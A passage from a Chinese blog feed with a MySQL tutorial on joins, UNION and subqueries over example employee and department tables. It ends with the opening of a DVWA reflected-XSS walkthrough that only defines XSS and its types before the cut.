class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp , dept <span class="keyword">where</span> emp.dept_id <span class="operator">=</span> dept.id;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019133620620.png" alt="image-20221019133620620"></p><div style="text-indent:2em;"><font size="4">而由于id为17的员工，没有dept_id字段值，所以在多表查询时，根据连接查询的条件并没有查询到。</font></div><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul><li><div><font size="4">连接查询</font></div><ul><li><div><font size="4">内连接：相当于查询A、B交集部分数据</font></div></li><li><div><font size="4">外连接：</font></div></li><li><div><font size="4">左外连接：查询左表所有数据，以及两张表交集部分数据</font></div></li><li><div><font size="4">右外连接：查询右表所有数据，以及两张表交集部分数据</font></div></li><li><div><font size="4">自连接：当前表与自身的连接查询，自连接必须使用表别名</font></div></li></ul></li><li><div><font size="4">子查询</font></div></li></ul><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019134002584.png" alt="image-20221019134002584"></p><hr><h2 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019134114287.png" alt="image-20221019134114287"></p><div style="text-indent:2em;"><font size="4">内连接查询的是两张表交集部分的数据。(也就是绿色部分的数据)</font></div><div style="text-indent:2em;"><font size="4">内连接的语法分为两种: 隐式内连接、显式内连接。先来学习一下具体的语法结构。</font></div><h3 id="隐式内连接"><a href="#隐式内连接" class="headerlink" title="隐式内连接"></a>隐式内连接</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表<span class="number">1</span> , 表<span class="number">2</span> <span class="keyword">WHERE</span> 条件 ... ;</span><br></pre></td></tr></table></figure><h3 id="显式内连接"><a href="#显式内连接" class="headerlink" title="显式内连接"></a>显式内连接</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表<span class="number">1</span> [ <span class="keyword">INNER</span> ] <span class="keyword">JOIN</span> 表<span class="number">2</span> <span class="keyword">ON</span> 连接条件 ... ;</span><br></pre></td></tr></table></figure><div><font size="4">案例:A. 查询每一个员工的姓名 , 及关联的部门的名称 (隐式内连接实现)</font></div><div><font size="4">表结构: emp , dept</font></div><div><font size="4">连接条件: emp.dept_id = dept.id</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> emp.name , dept.name <span class="keyword">from</span> emp , dept <span class="keyword">where</span> emp.dept_id <span class="operator">=</span> dept.id ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 为每一张表起别名,简化SQL编写</span></span><br><span class="line"><span class="keyword">select</span> e.name,d.name <span class="keyword">from</span> emp e , dept d <span class="keyword">where</span> e.dept_id <span class="operator">=</span> d.id;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019153453708.png" alt="image-20221019153453708"></p><div><font size="4">案例B. 查询每一个员工的姓名 , 及关联的部门的名称 (显式内连接实现) --- INNER JOIN ... ON ...</font></div><div><font size="4">表结构: emp , dept</font></div><div><font size="4">连接条件: emp.dept_id = dept.id</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> e.name, d.name <span class="keyword">from</span> emp e <span class="keyword">inner</span> <span class="keyword">join</span> dept d <span class="keyword">on</span> e.dept_id <span class="operator">=</span> d.id;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 为每一张表起别名,简化SQL编写</span></span><br><span class="line"><span class="keyword">select</span> e.name, d.name <span class="keyword">from</span> emp e <span class="keyword">join</span> dept d <span class="keyword">on</span> e.dept_id <span class="operator">=</span> d.id;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019153520063.png" alt="image-20221019153520063"></p><blockquote><div><font size="4">表的别名:</font></div><div><font size="4">①. tablea as 别名1 , tableb as 别名2 ;</font></div><div><font size="4">②. tablea 别名1 , tableb 别名2 ;</font></div><div><font size="4">注意事项：一旦为表起了别名，就不能再使用表名来指定对应的字段了，此时只能够使用别名来指定字段。</font></div></blockquote><hr><h2 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019152606338.png" alt="image-20221019152606338"></p><div style="text-indent:2em;"><font size="4">外连接分为两种，分别是：左外连接 和 右外连接。具体的语法结构为：</font></div><h3 id="左外连接"><a href="#左外连接" class="headerlink" title="左外连接"></a>左外连接</h3><div><font size="4">左外连接相当于查询表1(左表)的所有数据，当然也包含表1和表2交集部分的数据。</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表<span class="number">1</span> <span class="keyword">LEFT</span> [ <span class="keyword">OUTER</span> ] <span class="keyword">JOIN</span> 表<span class="number">2</span> <span class="keyword">ON</span> 条件 ... ;</span><br></pre></td></tr></table></figure><h3 id="右外连接"><a href="#右外连接" class="headerlink" title="右外连接"></a>右外连接</h3><div><font size="4">右外连接相当于查询表2(右表)的所有数据，当然也包含表1和表2交集部分的数据。</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表<span class="number">1</span> <span class="keyword">RIGHT</span> [ <span class="keyword">OUTER</span> ] <span class="keyword">JOIN</span> 表<span class="number">2</span> <span class="keyword">ON</span> 条件 ... ;</span><br></pre></td></tr></table></figure><div><font size="4">案例:A. 查询emp表的所有数据, 和对应的部门信息</font></div><div><font size="4">由于需求中提到，要查询emp的所有数据，所以是不能内连接查询的，需要考虑使用外连接查询。</font></div><div><font size="4">表结构: emp, dept</font></div><div><font size="4">连接条件: emp.dept_id = dept.id</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> e.<span class="operator">*</span>, d.name <span class="keyword">from</span> emp e <span class="keyword">left</span> <span class="keyword">outer</span> <span class="keyword">join</span> dept d <span class="keyword">on</span> e.dept_id <span class="operator">=</span> d.id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> e.<span class="operator">*</span>, d.name <span class="keyword">from</span> emp e <span class="keyword">left</span> <span class="keyword">join</span> dept d <span class="keyword">on</span> e.dept_id <span class="operator">=</span> d.id;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019153552173.png" alt="image-20221019153552173"></p><div><font size="4">案例:B. 查询dept表的所有数据, 和对应的员工信息(右外连接)</font></div><div><font size="4">由于需求中提到，要查询dept表的所有数据，所以是不能内连接查询的，需要考虑使用外连接查询。</font></div><div><font size="4">表结构: emp, dept</font></div><div><font size="4">连接条件: emp.dept_id = dept.id</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> d.<span class="operator">*</span>, e.<span class="operator">*</span> <span class="keyword">from</span> emp e <span class="keyword">right</span> <span class="keyword">outer</span> <span class="keyword">join</span> dept d <span class="keyword">on</span> e.dept_id <span class="operator">=</span> d.id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> d.<span class="operator">*</span>, e.<span class="operator">*</span> <span class="keyword">from</span> dept d <span class="keyword">left</span> <span class="keyword">outer</span> <span class="keyword">join</span> emp e <span class="keyword">on</span> e.dept_id <span class="operator">=</span> d.id;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019153902164.png" alt="image-20221019153902164"></p><blockquote><div><font size="4">注意事项：左外连接和右外连接是可以相互替换的，只需要调整在连接查询时SQL中，表结构的先后顺序就可以了。而我们在日常开发使用时，更偏向于左外连接。</font></div></blockquote><hr><h2 id="自连接"><a href="#自连接" class="headerlink" title="自连接"></a>自连接</h2><h3 id="自连接查询"><a href="#自连接查询" class="headerlink" title="自连接查询"></a>自连接查询</h3><div><font size="4">自连接查询，顾名思义，就是自己连接自己，也就是把一张表连接查询多次。</font></div><div><font size="4">而对于自连接查询，可以是内连接查询，也可以是外连接查询。</font></div><div><font size="4">自连接的查询语法：</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表A 别名A <span class="keyword">JOIN</span> 表A 别名B <span class="keyword">ON</span> 条件 ... ;</span><br></pre></td></tr></table></figure><div><font size="4">案例：A. 查询员工 及其 所属领导的名字</font></div><div><font size="4">表结构: emp</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a.name , b.name <span class="keyword">from</span> emp a , emp b <span class="keyword">where</span> a.managerid <span class="operator">=</span> b.id;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019154322618.png" alt="image-20221019154322618"></p><div><font size="4">案例：B. 查询所有员工 emp 及其领导的名字 emp , 如果员工没有领导, 也需要查询出来</font></div><div><font size="4">表结构: emp a , emp b</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a.name <span class="string">&#x27;员工&#x27;</span>, b.name <span class="string">&#x27;领导&#x27;</span> <span class="keyword">from</span> emp a <span class="keyword">left</span> <span class="keyword">join</span> emp b <span class="keyword">on</span> a.managerid <span class="operator">=</span> b.id;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019154453505.png" alt="image-20221019154453505"></p><blockquote><div><font size="4">注意事项：在自连接查询中，必须要为表起别名，要不然我们不清楚所指定的条件、返回的字段，到底是哪一张表的字段。</font></div></blockquote><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><div><font size="4">对于union查询，就是把多次查询的结果合并起来，形成一个新的查询结果集。</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表A ...</span><br><span class="line"><span class="keyword">UNION</span> [ <span class="keyword">ALL</span> ]</span><br><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表B ....;</span><br></pre></td></tr></table></figure><ul><li><div><font size="4">对于联合查询的多张表的列数必须保持一致，字段类型也需要保持一致。</font></div></li><li><div><font size="4">union all 会将全部的数据直接合并在一起，union 会对合并之后的数据去重。</font></div></li></ul><div><font size="4">案例:A. 将薪资低于 5000 的员工 , 和 年龄大于 50 岁的员工全部查询出来.</font></div><div><font size="4">当前对于这个需求，我们可以直接使用多条件查询，使用逻辑运算符 or 连接即可。 </font></div><div><font size="4">那这里，也可以通过union/union all来联合查询.</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> salary <span class="operator">&lt;</span> <span class="number">5000</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> age <span class="operator">&gt;</span> <span class="number">50</span>;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019154938042.png" alt="image-20221019154938042"></p><blockquote><div><font size="4"><b>union all查询出来的结果，仅仅进行简单的合并，并未去重。</b></font></div></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> salary <span class="operator">&lt;</span> <span class="number">5000</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> age <span class="operator">&gt;</span> <span class="number">50</span>;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019155114802.png" alt="image-20221019155114802"></p><blockquote><div><font size="4"><b>union 联合查询，会对查询出来的结果进行去重处理。</b></font></div></blockquote><div class="tip warning"><p>注意：如果多条查询语句查询出来的结果，字段数量不一致，在进行union/union all联合查询时，将会报错</p></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019155716337.png" alt="image-20221019155716337"></p><hr><h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><div><font size="4">SQL语句中嵌套SELECT语句，称为嵌套查询，又称子查询。</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> t1 <span class="keyword">WHERE</span> column1 <span class="operator">=</span> ( <span class="keyword">SELECT</span> column1 <span class="keyword">FROM</span> t2 );</span><br></pre></td></tr></table></figure><div><font size="4">子查询外部的语句可以是INSERT / UPDATE / DELETE / SELECT 的任何一个。</font></div><h3 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h3><div><font size="4">根据子查询结果不同，分为：</font></div><div style="text-indent:4em;"><font size="4">A. 标量子查询（子查询结果为单个值）</font></div><div style="text-indent:4em;"><font size="4">B. 列子查询(子查询结果为一列)</font></div><div style="text-indent:4em;"><font size="4">C. 行子查询(子查询结果为一行)</font></div><div style="text-indent:4em;"><font size="4">D. 表子查询(子查询结果为多行多列)</font></div><div><font size="4">根据子查询位置，分为：</font></div><div style="text-indent:4em;"><font size="4">A. WHERE之后</font></div><div style="text-indent:4em;"><font size="4">B. FROM之后</font></div><div style="text-indent:4em;"><font size="4">C. SELECT之后</font></div><h3 id="标量子查询"><a href="#标量子查询" class="headerlink" title="标量子查询"></a>标量子查询</h3><div><font size="4">子查询返回的结果是单个值（数字、字符串、日期等），最简单的形式，这种子查询称为标量子查询。</font></div><div><font size="4">常用的操作符：= <> > >= < <=</font></div><div><font size="4">案例:A. 查询 "销售部" 的所有员工信息</font></div><div><font size="4">完成这个需求时，我们可以将需求分解为两步：</font></div><div><font size="4">①. 查询 "销售部" 部门ID</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;销售部&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019160609543.png" alt="image-20221019160609543"></p><div><font size="4">②. 根据 "销售部" 部门ID, 查询员工信息</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> dept_id <span class="operator">=</span> (<span class="keyword">select</span> id <span class="keyword">from</span> dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;销售部&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019160708595.png" alt="image-20221019160708595"></p><div><font size="4">案例:B. 查询在 "方东白" 入职之后的员工信息</font></div><div><font size="4">完成这个需求时，我们可以将需求分解为两步：</font></div><div><font size="4">①. 查询 方东白 的入职日期</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> entrydate <span class="keyword">from</span> emp <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;方东白&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019160815272.png" alt="image-20221019160815272"></p><div><font size="4">②. 查询指定入职日期之后入职的员工信息</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> entrydate <span class="operator">&gt;</span> (<span class="keyword">select</span> entrydate <span class="keyword">from</span> emp <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;方东白&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019160856520.png" alt="image-20221019160856520"></p><h3 id="列子查询"><a href="#列子查询" class="headerlink" title="列子查询"></a>列子查询</h3><div><font size="4">子查询返回的结果是一列（可以是多行），这种子查询称为列子查询。</font></div><div><font size="4">常用的操作符：IN 、NOT IN 、 ANY 、SOME 、 ALL</font></div><div>    <table style="background-color:#fff;">        <tr align="center">            <td>操作符</td>            <td>描述</td>        </tr>        <tr align="center">            <td>IN</td>            <td>在指定的集合范围之内，多选一</td>        </tr>        <tr align="center">            <td>NOT IN</td>            <td>不在指定的集合范围之内</td>        </tr>        <tr align="center">            <td>ANY</td>            <td>子查询返回列表中，有任意一个满足即可</td>        </tr>           <tr align="center">            <td>SOME</td>            <td>与ANY等同，使用SOME的地方都可以使用ANY</td>        </tr>        <tr align="center">            <td>ALL</td>            <td>子查询返回列表的所有值都必须满足</td>        </tr>    </table></div><div><font size="4">案例:A. 查询 "销售部" 和 "市场部" 的所有员工信息</font></div><div><font size="4">分解为以下两步:</font></div><div><font size="4">①. 查询 "销售部" 和 "市场部" 的部门ID</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;销售部&#x27;</span> <span class="keyword">or</span> name <span class="operator">=</span> <span class="string">&#x27;市场部&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019161338735.png" alt="image-20221019161338735"></p><div><font size="4">②. 根据部门ID, 查询员工信息</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> dept_id <span class="keyword">in</span> (<span class="keyword">select</span> id <span class="keyword">from</span> dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;销售部&#x27;</span> <span class="keyword">or</span> name <span class="operator">=</span> <span class="string">&#x27;市场部&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019161417713.png" alt="image-20221019161417713"></p><div><font size="4">案例:B. 查询比 财务部 所有人工资都高的员工信息</font></div><div><font size="4">分解为以下两步:</font></div><div><font size="4">①. 查询所有 财务部 人员工资</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;财务部&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> salary <span class="keyword">from</span> emp <span class="keyword">where</span> dept_id <span class="operator">=</span> (<span class="keyword">select</span> id <span class="keyword">from</span> dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;财务部&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019161609386.png" alt="image-20221019161609386"></p><div><font size="4">②. 比 财务部 所有人工资都高的员工信息</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> salary <span class="operator">&gt;</span> <span class="keyword">all</span> ( <span class="keyword">select</span> salary <span class="keyword">from</span> emp <span class="keyword">where</span> dept_id <span class="operator">=</span> (<span class="keyword">select</span> id <span class="keyword">from</span> dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;财务部&#x27;</span>) );</span><br></pre></td></tr></table></figure><div><font size="4">案例:C. 查询比研发部其中任意一人工资高的员工信息</font></div><div><font size="4">分解为以下两步:</font></div><div><font size="4">①. 查询研发部所有人工资</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> salary <span class="keyword">from</span> emp <span class="keyword">where</span> dept_id <span class="operator">=</span> (<span class="keyword">select</span> id <span class="keyword">from</span> dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;研发部&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019161828209.png" alt=""></p><div><font size="4">②. 比研发部其中任意一人工资高的员工信息</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> salary <span class="operator">&gt;</span> <span class="keyword">any</span> ( <span class="keyword">select</span> salary <span class="keyword">from</span> emp <span class="keyword">where</span> dept_id <span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;研发部&#x27;</span>) );</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019161927244.png" alt="image-20221019161927244"></p><h3 id="行子查询"><a href="#行子查询" class="headerlink" title="行子查询"></a>行子查询</h3><div><font size="4">子查询返回的结果是一行（可以是多列），这种子查询称为行子查询。</font></div><div><font size="4">常用的操作符：= 、<> 、IN 、NOT IN</font></div><div><font size="4">案例:A. 查询与 "张无忌" 的薪资及直属领导相同的员工信息 ;</font></div><div><font size="4">这个需求同样可以拆解为两步进行:</font></div><div><font size="4">①. 查询 "张无忌" 的薪资及直属领导</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> salary, managerid <span class="keyword">from</span> emp <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;张无忌&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019162044522.png" alt="image-20221019162044522"></p><div><font size="4">②. 查询与 "张无忌" 的薪资及直属领导相同的员工信息 ;</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> (salary,managerid) <span class="operator">=</span> (<span class="keyword">select</span> salary, managerid <span class="keyword">from</span> emp <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;张无忌&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019162131766.png" alt="image-20221019162131766"></p><h3 id="表子查询"><a href="#表子查询" class="headerlink" title="表子查询"></a>表子查询</h3><div><font size="4">子查询返回的结果是多行多列，这种子查询称为表子查询。</font></div><div><font size="4">常用的操作符：IN</font></div><div><font size="4">案例:A. 查询与 "鹿杖客" , "宋远桥" 的职位和薪资相同的员工信息</font></div><div><font size="4">分解为两步执行:</font></div><div><font size="4">①. 查询 "鹿杖客" , "宋远桥" 的职位和薪资</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> job, salary <span class="keyword">from</span> emp <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;鹿 杖客&#x27;</span> <span class="keyword">or</span> name <span class="operator">=</span> <span class="string">&#x27;宋远桥&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019162426017.png" alt="image-20221019162426017"></p><div><font size="4">②. 查询与 "鹿杖客" , "宋远桥" 的职位和薪资相同的员工信息</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> (job,salary) <span class="keyword">in</span> ( <span class="keyword">select</span> job, salary <span class="keyword">from</span> emp <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;鹿杖客&#x27;</span> <span class="keyword">or</span> name <span class="operator">=</span> <span class="string">&#x27;宋远桥&#x27;</span> );</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019162507313.png" alt="image-20221019162507313"></p><div><font size="4">案例:B. 查询入职日期是 "2006-01-01" 之后的员工信息 , 及其部门信息</font></div><div><font size="4">分解为两步执行:</font></div><div><font size="4">①. 入职日期是 "2006-01-01" 之后的员工信息</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> entrydate <span class="operator">&gt;</span> <span class="string">&#x27;2006-01-01&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019162606447.png" alt="image-20221019162606447"></p><div><font size="4">②. 查询这部分员工, 对应的部门信息;</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> e.<span class="operator">*</span>, d.<span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> entrydate <span class="operator">&gt;</span> <span class="string">&#x27;2006-01-01&#x27;</span>) e <span class="keyword">left</span> <span class="keyword">join</span> dept d <span class="keyword">on</span> e.dept_id <span class="operator">=</span> d.id ;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019162644885.png" alt="image-20221019162644885"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reflected XSS</title>
      <link href="/posts/fe1aa8c3/"/>
      <url>/posts/fe1aa8c3/</url>
      
        <content type="html"><![CDATA[<div><font size="6"><b><center>通关DVWA全级别 Reflected XSS</center></b></font></div><h1 id="XSS漏洞原理"><a href="#XSS漏洞原理" class="headerlink" title="XSS漏洞原理"></a>XSS漏洞原理</h1><div style="text-indent:2em;"><font size="4">跨站脚本攻击（Cross Site Scripting），为了不和层叠样式表（Cascading Style Sheets，缩写：CSS）混淆，所以架构跨站脚本攻击缩写为XSS。XSS就是攻击者在web页面插入恶意的Script代码，当用户浏览该页面时，嵌入其中的js代码会被执行，从而达到恶意攻击的目的。某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。</font></div><hr><h1 id="XSS的类型"><a href="#XSS的类型" class="headerlink" title="XSS的类型"></a>XSS的类型</h1><h2 id="XSS类型一般分为三种："><a href="#XSS类型一般分为三种：" class="headerlink" title="XSS类型一般分为三种："></a>XSS类型一般分为三种：</h2><h2 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h2><div style="text-indent:2em;"><font size="4">反射型XSS只是简单的把用户输入的数据“反射”给浏览器，也就是需要诱使用户“点击”一个恶意链接，才能攻击成功。反射型XSS也叫作“非持久性XSS”</font></div><h2 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2.存储型XSS"></a>2.存储型XSS</h2><div style="text-indent:2em;"><font 